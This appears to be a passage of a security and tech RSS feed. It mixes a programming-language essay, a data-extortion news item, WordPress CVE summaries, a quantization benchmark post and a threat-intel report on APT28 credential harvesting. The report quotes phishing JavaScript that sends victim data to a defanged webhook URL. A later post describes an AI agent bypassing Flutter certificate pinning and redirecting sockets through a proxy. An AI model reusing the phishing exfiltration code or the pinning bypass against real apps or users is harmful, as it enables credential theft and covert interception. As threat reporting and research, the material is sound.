Ruby on Rails, and it would instantly propel him to internet fame and fortune. So it's not because of incompetency. Nor is it because of economics. So why else wouldn't someone port Ruby on Rails to Java? Well, simply, because they .If you're a knowledgeable Ruby programmer and you take a deep look through an introductory Rails tutorial, you'll notice that pretty much all of the Ruby language features come into play in some way. Rail's ActiveRecords library makes pervasive use of Ruby's meta-programming features. Rail's template system heavily relies upon Ruby's runtime evaluation features. To make your website respond to a user click, you subclass  and reuse pre-coded functionality by importing various . Events are handled often by attaching a call back in the form of a  to some widget. Casual website designers can safely completely ignore the concepts of types and memory deallocation because Ruby is dynamically-typed and garbage-collected. These features are simply not available in all other languages. Java's meta-programming features, for example, are just not powerful enough to implement a system like ActiveRecords. Rails is only possible  of Ruby.So, completely unbeknownst to my friend, he is actually making  use of all those subtle language features that he claimed he never cared about. And this is intentional! Ruby on Rails was  to make it possible to build websites without understanding type theory, or memory management, or object-oriented design patterns. Rails allow website designers to focus on designing websites, not managing their software infrastructure. My friend is enjoying all the benefits of Ruby without even knowing it, and that's the whole point.Taking a step back, the concept of packaging code into easy-to-use libraries is not new. It's been around even in the days when programs were stored on punched paper tape. There are still vast libraries of assembly code containing useful subroutines. And  programming language ever designed provided some way for common functionality to be reused. To me, this is the primary purpose of a general-purpose programming language, to  the creation of a wide spectrum of easy-to-use libraries. The design of the programming language directly determines what sort of libraries you can write and how easy they are to use in the end. In the C language, the only major feature provided for enabling reuse is the ability to declare and call functions. So guess what? The majority of C libraries are basically large collections of functions. Ruby on Rails provides a concise way for expressing:  when the button is clicked. The "" part is implemented in Ruby as a first-class function. How would it be implemented in languages like Java which don't support them? Well, the behaviour of first-class functions can be mocked by defining a new event handler class with a single  method and then passing an instance of this class to the button object. So guess what? Using a Java library typically entails declaring a humongous number of handler classes. The programming language directly shapes the design of its libraries.In the early days of software, collections of functions were sufficient in allowing us to code reusable components. A lot of early software was numerical in nature, and there was a library function for every numerical algorithm you would want to run. Numbers go in. Numbers come out. Functions were perfectly adequate for this. Unix and C were also designed in a time when the majority of computing happens in . You prepare some input data, call a function or run a program, and you get some output data back. But computing has changed radically since the 70's. Nowadays, most interesting programs are . When a user clicks a button, it should . It was rare to want to extend the functionality of a library of the 70's. The library provides a collection of useful functions. If one of them does what you want, then use it. If not, then write your own. But with the advent of interactive software, the need for extensible libraries became apparent. Programmers wanted GUI libraries that allowed them to say: when a user clicks a button, please run  code. Java (and C++) provides a limited method for extending an existing library's functionality through its subclassing mechanism. So using a Java library often consists of subclassing a number of magical classes and then  a number of magical methods. This style of library became so pervasive at one point that we even gave them a new name. They're called .I surmise that probably many general purpose programming languages were originally designed because of the author's inability to write a good library for the language that he was using at the time. The initial impetus that got me thinking about designing Stanza, for example, came out of my frustrations with trying to write an easy-to-use game programming library in Java. To handle concurrency, traditional game programming frameworks required sprite behaviours to be programmed using a state machine model. But that's not how we intuitively think about sprites in our heads. Intuitively, we think about a character's behaviour as consisting of a sequence of steps. For example, first the character jumps, and then after he lands he looks to his left and then his right for the nearest enemy. If he sees one then he goes to attack it, otherwise he jumps again. He does this three times, and if he doesn't see an enemy after three jumps, then he takes a short nap. Transforming this sequence of steps into a state machine is an incredibly tedious and error-prone process, and most importantly, feels . It felt like I was doing the same thing again and again. So the natural question is, can I just make this state machine transformation a library and re-use it? It turns out I couldn't, not in Java at least. The language feature that I needed was some sort of coroutine or continuation mechanism. After some research I found that the Scheme language supports continuations, so the Scheme version of my game programming library was much easier to use than the Java version. Because of its support for continuations, the Scheme version of my game library does not require users to write their sprite behaviour as state machines. But it wasn't better than the Java version in  way. Most importantly, the Java version was statically typed and so the compiler automatically caught many of your mistakes for you. The Scheme version didn't have this ability and thus debugging my games took a bit longer. At this point, the right question to ask would be, well can you write a static-typing library for Scheme that then automatically checks your code for type errors? And the current answer, for now and for the foreseeable future, is . No mainstream language today allows you to write a library to extend its type system. Stanza doesn't either. It just attempts to provide one that is useful for a wider audience. Since the purpose of general-purpose programming languages are to enable the creation of powerful libraries, this means that different languages can also be characterized by what features they provide that  be written as libraries. Stanza provides an optional type system, garbage collection, and a multimethod based object system. But if you don't like Stanza's object system, there is no way to write your own. This is one of the main directions of programming language research. Can we design a language so expressive that library writers can easily write the most appropriate object system, or most appropriate type system, to fit their application? Perhaps one day we'll have such a language. Racket and Shen provide mechanisms for extending their type systems and research on meta-object protocols were attempts at designing extensible object systems. So languages are differentiated by what types of libraries you can write in them and what types of libraries you can't. In summary, the purpose of a general-purpose programming language is to enable the creation of powerful and easy-to-use libraries. The more powerful the language, the easier the libraries are to use. Code that makes use of a perfectly tuned library should read almost like a set of instructions for a coworker. So the next time you come across a particularly elegant library, know that many decades of language research has gone into making that possible. If you're curious about specifically which language features a library makes use of, then you can dig deeper, explore, and appreciate the thought that went into its implementation. If you're not curious about all this subtle language stuff, you can safely ignore it all and get on with your work. That's the whole point. ]]></content:encoded></item><item><title>One million customers on alert as extortion group claims massive Brightspeed data haul</title><link>https://www.malwarebytes.com/blog/news/2026/01/one-million-customers-on-alert-as-extortion-group-claims-massive-brightspeed-data-haul</link><author></author><category>threatintel</category><pubDate>Wed, 7 Jan 2026 12:19:17 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[US fiber broadband company Brightspeed is investigating claims by the Crimson Collective extortion group that it stole sensitive data belonging to more than 1 million residential customers, including extensive personally identifiable information (PII), as well as account and billing details.Brightspeed is one of the largest fiber broadband providers in the US and serves customers across 20 states.On January 4, the Crimson Collective posted this message on its Telegram channel:“If anyone has someone working at BrightSpeed, tell them to read their mails fast!We have in our hands over 1m+ residential user PII’s, which contains the following:Customer/account master records containing full PII such as names, emails, phone numbers, billing and service addresses, account status, network type, consent flags, billing system, service instance, network assignment, and site IDs.Address qualification responses with address IDs, full postal addresses, latitude and longitude coordinates, qualification status (fiber/copper/4G), maximum bandwidth, drop length, wire center, marketing profile codes, and eligibility flags.User-level account details keyed by session/user IDs, overlapping with PII including names, emails, phones, service addresses, account numbers, status, communication preferences, and suspend reasons.Payment history per account, featuring payment IDs, dates, amounts, invoice numbers, card types and masked card numbers (last 4 digits), gateways, and status; some entries indicate null or empty histories.Payment methods per account, including default payment method IDs, gateways, masked credit card numbers, expiry dates, BINs, holder names and addresses, status flags (Active/Declined), and created/updated timestamps.Appointment/order records per billing account, with customer PII such as names, emails, phones, addresses, order numbers, status, appointment windows, dispatch and technician information, and install types.Sample will be dropped on monday night time, letting them some time first to answer to us.

Unauthorized access may allow modification of feature flags and export of sensitive data.

The Optional Email plugin for WordPress is vulnerable to Privilege Escalation via Account Takeover in all versions up to, and including, 1.3.11. This is due to the plugin not restricting its 'random_password' filter to registration contexts, allowing the filter to affect password reset key generation. This makes it possible for unauthenticated attackers to set a known password reset key when initiating a password reset, reset the password of any user including administrators, and gain access to their accounts.

The MoneySpace plugin for WordPress is vulnerable to Sensitive Information Exposure in all versions up to, and including, 2.13.9. This is due to the plugin storing full payment card details (PAN, card holder name, expiry month/year, and CVV) in WordPress post_meta using base64_encode(), and then embedding these values into the publicly accessible mspaylink page's inline JavaScript without any authentication or authorization check. This makes it possible for unauthenticated attackers who know or can guess an order_id to access the mspaylink endpoint and retrieve full credit card numbers and CVV codes directly from the HTML/JS response, constituting a severe PCI-DSS violation.

This activity represents an expansion of BlueDelta’s ongoing credential-theft operations previously detailed in Insikt Group’s December 2025 report.Insikt Group identified BlueDelta targeting a small but distinct set of victims during its 2025 credential-harvesting activity. Targets included individuals linked to a Turkish energy and nuclear research agency, as well as staff affiliated with a European think tank and organizations in North Macedonia and Uzbekistan. The use of Turkish-language and regionally targeted lure material suggests that BlueDelta tailored its content to increase credibility among specific professional and geographic audiences. These selections reflect a continued interest in organizations connected to energy research, defense cooperation, and government communication networks relevant to Russian intelligence priorities.BlueDelta’s credential-harvesting pages impersonated a range of legitimate webmail and VPN services, including Microsoft Outlook Web Access (OWA), Google, and Sophos VPN portals. Each page replicated authentic login interfaces and redirected victims to legitimate websites after they submitted their credentials, thereby reducing suspicion. The campaigns relied heavily on free hosting and tunneling services, such as Webhook[.]site, InfinityFree, Byet Internet Services, and ngrok, to host phishing content, capture user data, and manage redirections. Several pages also incorporated legitimate PDF lure documents to enhance realism and evade automated detection.BlueDelta’s consistent abuse of legitimate internet service infrastructure demonstrates the group’s continued reliance on disposable services to host and relay credential data. These campaigns underscore the GRU’s sustained commitment to credential harvesting as a low-cost, high-yield method of collecting information that supports Russian intelligence objectives.BlueDelta expanded its credential-harvesting operations throughout 2025, deploying new campaigns themed as Microsoft Outlook Web Access (OWA), Google, and Sophos VPN login portals.The group leveraged a combination of free hosting and tunneling services, including Webhook[.]site, InfinityFree, Byet Internet Services, and ngrok, to host credential-harvesting pages and exfiltrate stolen data.Multiple campaigns incorporated legitimate PDF lure documents, such as publications from the Gulf Research Center and the EcoClimate Foundation, to increase the appearance of authenticity and bypass email security controls.BlueDelta used customized JavaScript functions to capture credentials, track victim activity, and automate redirection to legitimate websites, reducing manual setup and increasing operational efficiency.Targeted email addresses and redirection behavior suggest BlueDelta focused on researchers and institutions in Türkiye and Europe, aligning with Russia’s broader intelligence-gathering priorities.BlueDelta is a Russian state-sponsored threat group associated with the Main Directorate of the General Staff of the Russian Federation's Armed Forces (GRU). Also known as APT28, Fancy Bear, and Forest Blizzard, the group has carried out credential-harvesting and espionage operations for more than a decade. This campaign overlaps with activity previously attributed by Insikt Group to BlueDelta, which multiple Western governments attribute with high confidence to the GRU.Since at least the mid-2000s, BlueDelta has conducted phishing and credential-theft operations against a wide range of targets, including government institutions, defense contractors, weapons suppliers, logistics companies, and policy think tanks. These efforts aim to collect credentials and intelligence relevant to Russia’s military operations and strategic interests. Previously reported activity focused on Microsoft Outlook, UKR.NET, and other webmail services, using fake login portals hosted on free web infrastructure and compromised routers to capture usernames, passwords, and authentication codes.Between February and September 2025, Insikt Group analyzed a series of credential-harvesting campaigns attributed to BlueDelta. These campaigns demonstrate continued refinement of BlueDelta’s spearphishing tradecraft, with the group adopting new lure themes, multi-stage redirection chains, and enhanced credential-harvesting mechanisms. Each campaign abused free hosting and tunneling services to host malicious content and relay harvested data, reflecting BlueDelta’s persistent use of low-cost, easily disposable infrastructure.Microsoft OWA Credential HarvestingOn February 6, 2025, BlueDelta deployed a new credential-harvesting page themed as a Microsoft Outlook Web Access (OWA) login page, as shown in .BlueDelta employed the link-shortening service ShortURL for the first-stage redirection, using the URL hxxps://shorturl[.]at/Be4Xe. The shortened link redirected victims to a second stage, which was hosted using the free API service Webhook[.]site, via the URL hxxps://webhook[.]site/e8ae3bbd-ab02-46b7-b84c-f5f4baa5d7c7. BlueDelta has regularly used Webhook[.]site for credential harvesting and phishing in recent campaigns.The initial webhook in this campaign differs from those previously reported by Inskit Group; instead of hosting the credential-harvesting page, it uses HTML to load a PDF lure document into the victim's browser for two seconds before redirecting to a second webhook, as per .<html>
  <head>
    <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width">

  </body>
</html>
HTML used to display a PDF lure on the victim's browser (Source: Recorded Future)The PDF lure document, shown in , is a legitimate report published by the Saudi Arabia-based think tank Gulf Research Center (GRC), entitled “Strategic and Political Implications for Israel and Iran: The Day After War.”After the PDF lure has displayed for two seconds, the page redirects to a second webhook located at the URL hxxps://webhook[.]site/3791f8c0-1308-4c5b-9c82-0dc416aeb9c4, which hosts a spoofed OWA login page as shown in . The page's structure is very similar to that of previous BlueDelta credential-harvesting pages, but the theme has been updated to represent a login page rather than a password reset page., BlueDelta has added a new hidden HTML form element used to store the current page's URL. The HTML element is populated using JavaScript at page load, as shown in  and is later used to capture victim information when the page opens and credentials are submitted. This update reduces BlueDelta's administrative burden by eliminating the need for manual addition of the exfiltration URL to credential-harvesting pages.<input type="hidden" id="href" name="href" role="textbox" aria-labelledby="userNameLabel" value="hxxps://webhook[.]site/3791f8c0-1308-4c5b-9c82-0dc416aeb9c4"></div>Hidden HTML form element populated using the page URL at page load (Source: Recorded Future)<script>
const urlParams = new URLSearchParams(window.location.search);

var xhr = new XMLHttpRequest();
xhr.open('POST', document.getElementById('href').value);
xhr.setRequestHeader('Content-Type', 'application/json');

</script>
JavaScript used to capture the current URL, set a hidden form element, send a “page-opened” beacon, and change the displayed URL in the victim's browser (Source: Recorded Future)The stored URL is then used as the destination of a page-opened beacon, which collects the victim's email address from the query string parameter “” and sends it in JSON format back to the webhook. The webhook additionally captures the victim's IP address and user agent. After the page URL has been saved and the page-opened beacon sent, BlueDelta modifies the page URL to  to imitate a legitimate OWA login page.When the HTML form is submitted, a JavaScript function named  captures the entered username and password and sends them via an HTTP POST request to the hidden form element’s webhook. The page is then redirected to the GRC PDF hosted on the GRC website after a one-second delay, as shown in .]]></content:encoded></item><item><title>CVE-2025-47345 - Reusing a Nonce, Key Pair in Encryption in Automotive Platform</title><link>https://cvefeed.io/vuln/detail/CVE-2025-47345</link><author></author><category>vulns</category><pubDate>Tue, 6 Jan 2026 22:48:39 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-47345

            For this release, we optimize for what people actually experience when they run a model: 
            fast, high-quality responses on a specific target device.
          
            We use Shapelearn, our bitlength learning method to choose weight datatypes for 
            Qwen3-30B-A3B-Instruct-2507 that maximize performance in terms of 
            tokens per second (TPS) and output quality, with one practical constraint: the model 
            must fit comfortably in the available memory. Once it fits, making the file smaller 
            isn't a goal by itself. We only shrink further when it also improves the real tradeoff 
            people care about: .
          
            Approaching bitlength learning this way matters because in llama.cpp, "fewer bits" doesn't 
            automatically mean "more speed." Different quantization formats can trigger different kernels 
            and overheads, and on some GPUs, going lower-bit can even get slower, despite 
            using less memory.
           treat memory as a  to meet, then optimize what 
            matters most: .
          
            Yes, this 30B Qwen3 runs on a Raspberry Pi. On a Pi 5 (16GB),
            
            hits 8.03 TPS at 2.70 BPW and maintains 94.18% of BF16 quality. It genuinely feels
            real-time. More broadly, the same pattern shows up everywhere else: ByteShape models
            give you a better TPS/quality tradeoff than the alternatives (here we look at Unsloth
            and MagicQuant).
          
            On CPUs, reducing footprint via shorter bitlengths affects the TPS and accuracy
            tradeoff as one would expect: once the model fits, reducing footprint tends to increase
            TPS in a fairly monotonic way. If datatypes are selected correctly, you can trade a bit
            of quality for speed predictably, which makes it much easier to pick a point on the
            curve that matches your constraints.
          
            We'll start with the most memory-constrained CPU case (Raspberry Pi 5 16GB), where
            "fits in RAM" is the limiting factor, then move to an Intel i7 with 64GB, where
            everything fits.
          
            The figure below shows TPS vs. normalized accuracy for the models that fit in RAM on
            the Raspberry Pi 5 16GB.
          
              Raspberry Pi 5: Tokens per second vs quality (bubble size = model footprint)
            
            Notably, sustaining 8.5 TPS at 92%+ baseline accuracy with a 30B model on a 
            Raspberry Pi reshapes expectations for Pi-class systems. Overall, the trend shows that ShapeLearn 
            consistently produces better models, with ByteShape trending up and to the right of Unsloth, 
            achieving higher tokens per second at the same quality, or higher quality at the same throughput.
          We highlight choices for two primary objectives: accuracy or response time.Optimizing for response time while maintaining accuracy: For interactive, 
              on-device use, perceived responsiveness is driven by how quickly text appears, not peak 
              throughput. In practice, generation feels real-time once it reaches roughly , 
              comfortably above typical reading speed. In this Raspberry Pi real-time regime, 
              
              (2.70 BPW, 8.03 TPS, 94.18% accuracy) is our go-to recommendation: it crosses the
              real-time threshold while maintaining high accuracy. Compared 
              to Unsloth models at similar quality, ByteShape achieves real-time performance at lower BPW 
              and higher TPS, making it the more efficient choice for interactive edge deployment.
             The table below lists the models that achieve the highest 
              accuracy while still being able to run on a Raspberry Pi. Within this set, ByteShape models 
              make the best use of the available resources to maximize accuracy, occupying the 
               (~1.1–1.3% relative error, ~98.8% accuracy), while the 
              strongest Unsloth entries remain around 2.1–2.2% error (~97.9% accuracy). Compared to Unsloth's 
              , ByteShape achieves up to a  
              while still operating at , comfortably within TPS-norms on Raspberry PI 
              making it the better choice when accuracy is the priority. 
              Even when prioritizing maximum speed with some reduction in accuracy,
              
              offers a better tradeoff: more accurate, smaller, and faster than
              the fastest Unsloth model.
            
            Many other Unsloth and MagicQuant models (some of ours too!) are not in this chart. We compare 
            them in other sections, but they're not applicable in the Raspberry Pi case. They simply don't fit!
          
            Next, we move to the Intel i7 with 64GB RAM. The figure below shows TPS vs 
            normalized accuracy for all models.
          
              Intel i7: Tokens per second vs quality (bubble size = model footprint)
            
            Overall, ByteShape models outperform both Unsloth and MagicQuant, delivering higher quality at 
            comparable throughput using fewer bits per parameter. Only ByteShape offers models that run in 
            the 26+ TPS range, extending performance well beyond the other methods.
           At the high-accuracy end of the table,
              
              achieves the lowest relative error (0.25%), outperforming the best-running Unsloth
              models ( and  whose 
              relative errors are 0.36% and 0.44%). Compared directly, ByteShape delivers up to a 1.44× lower 
              error rate with higher throughput than , and a 1.76× lower error rate at 
              essentially the same speed as . MagicQuant  trails 
              in this regime, with both higher error and lower TPS.
             In the mid-accuracy, high-throughput region,
              
              combines ~98% accuracy with 23.1 TPS at just 3.25 BPW, offering the best overall
              balance in the table. Matching or exceeding this accuracy with Unsloth 
              () requires higher BPW and lower TPS, while choosing an Unsloth model 
              closer in speed () incurs a 1.73× higher error rate. MagicQuant does not 
              offer a competitive model in this range; its fastest entry () is behind both 
              ByteShape and Unsloth in accuracy and throughput.
             Across both quality-first and balanced settings, ByteShape consistently 
            converts the available bit budget into either higher accuracy or higher TPS, and is the only approach 
            that simultaneously covers the high-quality and 26+ TPS balanced-performance regions in this comparison.
          GPUs: RTX5090/32GB and RTX4080/16GB
            On GPUs, performance depends as much on  as on raw memory footprint. 
            For matmul/matvec, llama.cpp's quantization-specific GPU decode paths incur very different overheads, 
            so fewer bits per weight do  reliably translate to higher TPS. Instead, TPS often 
            peaks at quantization-specific sweet spots. Pushing BPW lower can even increase VRAM traffic 
            and instruction count, hurting performance rather than improving it. We dig into this behavior in 
            more detail right after the GPU results section, where the kernel-level tradeoffs become more apparent.
          
            We evaluate on two GPUs: an , which can run models 
             and typically reach the fastest sweet spots, and an 
            , where , forcing 
            different trade-offs and making the device-optimized curve easier to see.
          
            Let's start with the 5090, which has enough VRAM to support all of the quantized models. The figure 
            below shows TPS vs normalized accuracy.
          
              RTX 5090: Tokens per second vs quality (bubble size = model footprint)
            
            Two things stand out immediately:
            First, this GPU shows a clear : several ~4b models
            cluster at very high TPS with nearly identical quality. Examples include
            , ,
            
            , and MagicQuant , all running around ~302–303 TPS
            at ~98.4–98.9% accuracy. Within 
            this tight cluster, Unsloth edges out slightly in throughput and quality.
          
            Second, outside of that sweet spot, the tradeoff becomes much more uneven:
          
              Many other Unsloth and Magic Quant models show , regardless 
              of whether they are quantized more or less aggressively.
            
              Past the ~4b region, only ByteShape continues to increase TPS with a more predictable reduction in quality.
            Accuracy-critical workloads: when output quality is paramount,
            ByteShape delivers the most accurate model on the 5090:
            
            (4.67 BPW, 272.98 TPS, 99.75% accuracy). It surpasses  (6.57 BPW, 264.88 TPS, 99.64% accuracy) 
            while using fewer bits and achieving slightly higher throughput, and it clearly outperforms MagicQuant 
            mxfp4_moe-H-B16-EUR-IQ4NL-KO-Q5K-QD-Q6K [3] (5.46 BPW, 240.42 TPS, 99.32% accuracy) in both 
            accuracy and speed, making it the strongest choice when accuracy is a task-critical deployment requirement.
           If your GPU has enough VRAM to run a strong ~4b model that 
            already meets your speed and accuracy requirements, that cluster is an excellent default. The curve becomes 
            more interesting when task-critical deployment constraints demand higher accuracy or smaller models as for 
            example, under tighter memory budgets or constrained environments (as we'll see on the 4080).
          
            Next, let's move to a more accessible GPU, especially in these memory-challenged times. The biggest 
            stumbling block for the 4080 is its 16GB of VRAM, which is not sufficient to support the "magical" 
            ~4b quantizations for a 30B model. How convenient!This "avoids" the 5090's ~4b sweet 
            spot and forces a more "real-world" comparison under a hard VRAM budget. The figure below shows TPS versus 
            normalized accuracy for all models that fit on the 4080.
          
              RTX 4080: Tokens per second vs quality (bubble size = model footprint)
            
            On the RTX 4080, ByteShape consistently outperforms Unsloth under the same 16 GB VRAM constraint, 
            delivering a better TPS–quality tradeoff.
          
            In particular, ByteShape's highest-quality model that fits,
            
            (3.87 BPW, 214.81 TPS, 98.66% accuracy) delivers:
          
              a 1.59× lower error rate and 9.4% higher TPS vs.  (3.62 BPW, 196.42 TPS, 
              97.87% accuracy).
            
              a 2.54× lower error rate at the same TPS vs.  (2.84 BPW, 214.79 TPS, 
              96.59% accuracy).
            
            As we move to higher throughput, ByteShape's maintains accuracy, while Unsloth's error rate experiences a cliff.
          The Elephant in the Room: When 3-bits is not just 3-bits
            There is an inconvenient truth hiding in these results. On several setups, around 4 bpw is already 
            flying, and pushing quantization harder does not make things faster. It just manages to be smaller 
            and slower at the same time.
          
            Reducing the size of data doesn't automatically speed things up. While using fewer bits to store each 
            number seems like it should reduce memory traffic and speed up computation, GPUs don't work that way. 
            NVIDIA GPUs process work in fixed groups of 32 threads called "warps," which move through instructions 
            together in near lock-step. The GPU hardware is optimized for specific data formats, memory access patterns, 
            and operations that the chip's circuits are physically designed to handle efficiently. When your workload 
            matches these "golden paths", you get peak performance. Step outside them, and you hit slowdowns. This isn't 
            a design flaw, it's a deliberate tradeoff. Supporting more flexibility would require additional circuitry: 
            more wires, more transistors, more complexity. That extra hardware consumes more power and adds latency to 
            every operation, whether a program needs that flexibility or not.
          
            Here a few examples of relevant hardware "quirks": VRAM is read in aligned 32-byte blocks, so reading one 
            or 32 bytes consumes the same memory bandwidth. Both on-chip and off-chip memories can also suffer contention 
            depending on how data is laid out, meaning that a warp's accesses may complete in a single step or, in the 
            worst case, be serialized into 32 steps. And of course, decoding quantized values before computation can 
            require extra instructions, with the cost depending on the quantization scheme.
          
            This explains the behaviour we observe: 4-bit kernels use VRAM bandwidth more efficiently than 3- or 2-bit 
            kernels and require fewer decode steps before computation. At the same time, 4-bit kernels exploit subword 
            parallelism just as effectively as lower-bit kernels, and all rely primarily on dynamic caches rather than 
            shared memory to take advantage of data reuse when possible.
          
            So why llama.cpp hasn't been optimized to deliver peak speed for  bit-length? Our understanding 
            is that llama.cpp prioritizes portable, space-efficient quantization that can run across a 
            wide range of hardware. That design goal limits how aggressively backends can reshape data layouts or reorder 
            computation in ways that might help one GPU or one bit-width.
          
            A key example is its choice to store quantized weights in fixed blocks of 256 values. Each block is 
            self-contained (it carries everything needed to decode it) and sits at a simple, predictable offset in the 
            tensor, which makes the format easy to implement and fast to locate.
          
            The tradeoff is that GPUs often need to decode many blocks in parallel to keep their wide 
            compute units busy. With many independent 256-value blocks, those parallel decodes can translate into more 
            scattered or fragmented VRAM reads and extra decode overhead, reducing bandwidth efficiency, especially for 
            some lower-bit formats.
          Point for example on RTX 5090: a matrix multiply [256, 768] × [768, 2048] takes 
            datatype, but (mul_mat_q()+mul_mat_q_stream_k_fixup()). In other words, 
            cutting nearly 1.2 bits per weight (a reduction of more than 25% in weight footprint) leads 
            to a , directly hurting user experience.
          
            An excellent reminder that bitlength learning matters: Heuristics can get us part of the way, but not all 
            the way. ShapeLearn makes deliberate, per-tensor datatype choices that improve speed without sacrificing accuracy.
          Methodology (brief recap)
            If you're wondering how we are scoring these points, the full methodology is discussed in our previous 
            blog post. This post is intentionally focused on the curves and 
            device tradeoffs, so here is the quick version.
          
            For each quantized variant, we measure  on the target device and 
            compute a single  score relative to the , 
            using the same evaluation harness and prompts as the methodology post. The quality score aggregates 
            standard benchmarks (MMLU, GSM8K, IFEval, LiveCodeBench V4) into one number so you can compare points 
            directly. In other words, every dot in the plots answers two questions: how fast does it run on this 
            device, and how much quality does it retain compared to BF16, with memory fit as the first constraint.
          
            We also want to thank all for the many, excellent suggestions on our recent Reddit post for improving 
            and extending this evaluation strategy, and we’re actively working through them. Right now, evaluation 
            is the main bottleneck and not bitlength learning/quantization.
            Careful evaluation is essential to clearly communicate the strengths of each model.
          First, thank you for your tenacity. You made it through all of this without giving up. 
            We are sincerely flattered!
           treat memory as a constraint, not a goal. Once 
            a model fits on your device, what matters is the tradeoff curve, . 
            Across CPUs and GPUs,  consistently lands on the better side of that curve, 
            delivering either more speed at the same quality or higher quality at the same 
            speed.
          
            If you're deploying on a  and want a genuinely
            interactive experience, start with
            
            . On larger CPUs or GPUs, you can move up the curve toward higher-quality points with
            little loss in throughput, the same rule applies:
            fit first, then optimize the tradeoff.
          
            We'll keep releasing more device-targeted variants (and more plots). If your system can't run a 30B 
            model smoothly, don't blame the model or the silicon. ]]></content:encoded></item><item><title>Microsoft cancels plans to rate limit Exchange Online bulk emails</title><link>https://www.bleepingcomputer.com/news/microsoft/microsoft-cancels-plans-to-rate-limit-exchange-online-bulk-emails/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Tue, 6 Jan 2026 20:49:30 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Microsoft announced today that it has canceled plans to impose a daily limit of 2,000 external recipients on Exchange Online bulk email senders.

When my go-to Android MiTM approach failed, my curiosity only increased and I brought in Claude Opus 4.5 to help troubleshoot. What followed was an interesting collaboration in reverse engineering Flutter’s network stack – and it worked well enough that I wanted to capture both the technical outcome and what AI-assisted mobile security research can actually look like.I usually start with a rooted Android emulator running Frida with a mitmproxy system cert installed. Frida scripts help address the common issues in the way of capturing traffic, for example certificate pinning or device root detection. When I started up Cronometer with an unpinning script, mitmproxy logs were mostly empty despite obvious app activity. The app seemed to function fine, unaffected by my attempts to capture its traffic.I started an OpenCode session with Opus 4.5 and described the situation. It started initial analysis by decompiling the APK and reviewing the source – it quickly found that Cronometer was built with Flutter and pointed me to some helpful background reading. Flutter, I realized, posed some unique challenges to my approach:Flutter doesn’t use the Android TrustManager – It ships with its own SSL/TLS implementation via BoringSSL (Google’s fork of OpenSSL)Flutter isn’t proxy-aware – Even if you set the system proxy, Flutter’s Dart runtime will happily bypass it and connect directlyThe certificate pinning is baked into  – There’s no Java/Kotlin layer to hook with traditional Frida scriptsPrior work + the emulator help solve some of these problems:reFlutter patches the Flutter engine at compile time (requires rebuilding the APK)The Android emulator can force a proxy at the hardware-level, but remains a problem on physical devices – more on this laterNow with a better understanding of the challenges, I provided Claude with access to the rooted emulator via both  and Frida and instructed it to begin hooking the app to capture API traffic. I preferred Frida instrumentation over the reFlutter approach, so I gave NVISO’s disable-flutter-tls.js a try. This unfortunately failed to hook any of the target functions in the libflutter library – the root cause was iterated on by Opus 4.5, summarized below: As you can see above, Frida’s Process.findModuleByName("libflutter.so") returns null, so there’s nothing to scan for SSL bypass patterns in the script. Without the SSL bypass, the app rejects mitmproxy’s certificate during the TLS handshake.Since I didn’t have the hardware to run an ARM64 emulator, I switched to a physical device.Moving over to a rooted Pixel 6, let’s start with detecting  – Claude crafted a quick script:With  now being detected, let’s try the disable-flutter-tls-verification script:As you can see, the patch was successful. While this successfully bypassed the pinning, it meant I had at least one remaining problem: forcing the proxy routing. The (new) goal: intercept traffic from an unmodified APK on a physical ARM64 device, without rebuilding or patching it, using runtime instrumentation.This is where things get more interesting and the power of AI assistance started to shine. The iteration here was rapid and sometimes laborious, so I’ll try to summarize what ultimately lead to successful traffic interception.The first step in forcing routing through mitmproxy was to understand how the network stack was working. Claude made a copy of the disable-flutter-tls-verification script and added socket connection monitoring by hooking the raw socket . It worked well, but initially only displayed IP address destinations –  I challenged Claude to also hook the DNS resolution process.Impressive! Next, let’s intercept   within  and redirect it to my mitmproxy. A few more iterations on the script later:While the redirection was active, the proxy remained empty. A quick look at the mitmproxy logs revealed why:Client TLS handshake failed. The client disconnected during the handshake. If this happens consistently for mobile.cronometer.com, this may indicate that the client does not trust the proxy’s certificate.This was exactly what Claude warned about in point #4 above. Since I was redirecting traffic at the syscall level, the app was initiating a raw TLS handshake directly with the proxy port. However, mitmproxy (running in regular mode) was expecting a standard  request to identify the destination. Receiving a TLS Client Hello where it expected an HTTP verb caused the handshake to fail immediately.Rather than enabling transparent mode in mitmproxy (the easy way out), I challenged Claude to manually inject the  verb. This turned out to be the most complex part of the exercise – Claude had to iterate through several versions to ensure the logic handled the socket handshake correctly and that the SSL pinning patches were applied before the redirection logic engaged.The final result worked perfectly – again, very impressive. It would have taken me hours of manual trial-and-error to get right.Finally seeing those nutritious API calls.Note this solution wasn’t required – transparent mode would have probably solved this immediately, but the goal here was part exploration into the LLM’s capabilities.Bonus – Dynamic Proxy DetectionThe script worked well, though it hard-coded the proxy config in variables at the top. Let’s ask Claude to detect the Android system proxy dynamically and use it for the redirection.As you can see, the solution is very readable – the full implementation within the connect hook is much more complex. You can find it here.It’s clear that AI-assisted debugging dramatically accelerated the reverse engineering process. Overall, the code Opus 4.5 generated was well written, and this type of problem was a perfect fit for its iterative approach – especially since the criteria for success were clear (“are we capturing traffic?”). The proxy injection and HTTP CONNECT tunnel were particularly clever solutions.]]></content:encoded></item><item><title>Opus 4.5 is not the normal AI agent experience that I have had thus far</title><link>https://burkeholland.github.io/posts/opus-4-5-change-everything/</link><author>tbassetto</author><category>dev</category><pubDate>Tue, 6 Jan 2026 17:45:37 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>CVE-2025-32304 - WordPress WPCHURCH plugin &lt;= 2.7.0 - Local File Inclusion vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-32304</link><author></author><category>vulns</category><pubDate>Tue, 6 Jan 2026 17:34:06 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-32304

